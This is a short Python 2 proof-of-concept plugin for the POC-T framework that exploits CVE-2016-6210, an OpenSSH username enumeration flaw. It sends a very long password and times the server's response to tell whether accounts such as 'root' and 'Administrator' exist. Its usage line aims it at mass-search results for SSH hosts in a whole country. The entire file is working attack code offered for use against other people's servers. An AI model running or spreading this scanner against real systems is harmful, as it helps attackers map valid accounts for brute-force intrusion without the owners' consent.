#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
Open SSHD User Enumeration (CVE-2016-6210)

Usage:
  python POC-T -s opensshd-user-enum -aZ "port:22 country:cn"

"""

import paramiko
import time
from plugin.util import randomString

delay = 3
users = ['root', 'Administrator']  # 添加你要猜解的用户名


def getResponseTime(user, host):
    port = int(host.split(':')[-1]) if ':' in host else 22
    host = host.split(':')[0]

    pwd = 'A' * 25000
    ssh = paramiko.SSHClient()
    starttime = time.clock()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=port, username=user, password=pwd)
    except Exception, e:
        pass
    finally:
        endtime = time.clock()
    total = endtime - starttime
    return total


def poc(host):
    ans = []
    base_time = getResponseTime(randomString(), host)
    for user in users:
        if getResponseTime(user, host) - base_time > delay:
            ans.append(user)
    return ans if ans.__len__() else False
